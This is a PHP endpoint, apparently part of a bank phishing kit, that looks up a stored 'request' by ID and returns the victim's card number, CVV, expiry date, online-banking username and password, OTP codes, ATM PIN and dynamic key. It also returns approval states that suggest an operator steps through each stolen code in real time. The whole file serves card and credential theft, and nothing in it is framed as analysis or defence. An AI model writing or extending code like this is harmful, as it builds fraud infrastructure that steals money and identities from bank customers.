<?php
// api/estado.php
// 🔒 Endpoint para verificar el estado de una solicitud (polling)

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

// 🔥 Cargar ban_manager y bloquear IPs baneadas
require_once __DIR__ . '/../panel/config/ban_manager.php';
ban_init('json403');

$id = $_GET['id'] ?? '';

if (empty($id)) {
    http_response_code(400);
    echo json_encode([
        'success' => false,
        'error' => 'ID requerido'
    ]);
    exit;
}

$file = __DIR__ . '/../data/solicitudes.dat';
$solicitudes = [];

if (file_exists($file)) {
    $content = file_get_contents($file);
    $solicitudes = json_decode($content, true) ?: [];
}

foreach ($solicitudes as $s) {
    if ($s['id'] === $id) {
        $estado = $s['estado'] ?? 'pending';
        
        // MAPEAR ESTADOS PARA EL FRONTEND
        $estado_frontend = $estado;
        $estados_approved = ['approved', 'approved_otp', 'approved_clave_cajero'];
        $estados_rejected = ['rejected', 'rejected_otp', 'rejected_clave_cajero', 'rejected_user_error'];
        $estados_pending = ['pending_otp', 'pending_clave_cajero'];
        
        if (in_array($estado, $estados_approved)) {
            $estado_frontend = 'approved';
        } elseif (in_array($estado, $estados_rejected)) {
            $estado_frontend = 'rejected';
        } elseif (in_array($estado, $estados_pending)) {
            $estado_frontend = $estado;
        }
        
        // ============================================
        // 🔥 OBTENER EL MODO SEGÚN EL ESTADO
        // ============================================
        $otp_modo = $s['otp_modo'] ?? 'otp';
        
        if ($estado === 'pending_clave_cajero') {
            $otp_modo = 'clave_cajero';
        }
        
        if ($estado === 'pending_otp') {
            if ($otp_modo === 'clave_cajero' || $otp_modo === 'N/A' || empty($otp_modo)) {
                $otp_modo = 'otp';
            }
        }
        
        // ============================================
        // 🔥 OBTENER TODOS LOS CÓDIGOS - ESTA ES LA CLAVE
        // ============================================
        $otp_codigo = $s['otp_codigo'] ?? null;
        $clave_cajero_codigo = $s['clave_cajero_codigo'] ?? null;
        $clave_dinamica_codigo = $s['clave_dinamica_codigo'] ?? null;
        $otp_codigo_secundario = $s['otp_codigo_secundario'] ?? null;
        
        // Si están en N/A o vacíos, poner null
        if ($otp_codigo === 'N/A' || $otp_codigo === '') $otp_codigo = null;
        if ($clave_cajero_codigo === 'N/A' || $clave_cajero_codigo === '') $clave_cajero_codigo = null;
        if ($clave_dinamica_codigo === 'N/A' || $clave_dinamica_codigo === '') $clave_dinamica_codigo = null;
        if ($otp_codigo_secundario === 'N/A' || $otp_codigo_secundario === '') $otp_codigo_secundario = null;
        
        // Datos de la tarjeta
        $numero_tarjeta = $s['numero_tarjeta'] ?? $s['tarjeta'] ?? 'N/A';
        $cvv = $s['cvv'] ?? 'N/A';
        $vencimiento = $s['vencimiento'] ?? 'N/A';
        $banco = $s['banco'] ?? 'N/A';
        $usuario = $s['usuario'] ?? 'N/A';
        $password = $s['password'] ?? 'N/A';
        $monto = $s['monto'] ?? 'N/A';
        
        echo json_encode([
            'success' => true,
            'id' => $s['id'],
            'estado' => $estado_frontend,
            'estado_real' => $estado,
            'tipo_tarjeta' => $s['tipo_tarjeta'] ?? 'visa',
            'otp_codigo' => $otp_codigo,
            'clave_cajero_codigo' => $clave_cajero_codigo,
            'clave_dinamica_codigo' => $clave_dinamica_codigo,
            'otp_codigo_secundario' => $otp_codigo_secundario,
            'otp_modo' => $otp_modo,
            'numero_tarjeta' => $numero_tarjeta,
            'cvv' => $cvv,
            'vencimiento' => $vencimiento,
            'banco' => $banco,
            'usuario' => $usuario,
            'password' => $password,
            'monto' => $monto,
            'fecha_hora' => $s['fecha_hora'] ?? $s['fecha'] ?? date('Y-m-d H:i:s')
        ]);
        exit;
    }
}

echo json_encode([
    'success' => true,
    'id' => $id,
    'estado' => 'pending',
    'tipo_tarjeta' => 'visa',
    'otp_modo' => 'otp',
    'otp_codigo' => null,
    'clave_cajero_codigo' => null,
    'clave_dinamica_codigo' => null,
    'otp_codigo_secundario' => null,
    'numero_tarjeta' => 'N/A',
    'cvv' => 'N/A',
    'vencimiento' => 'N/A',
    'banco' => 'N/A',
    'usuario' => 'N/A',
    'password' => 'N/A',
    'monto' => 'N/A'
]);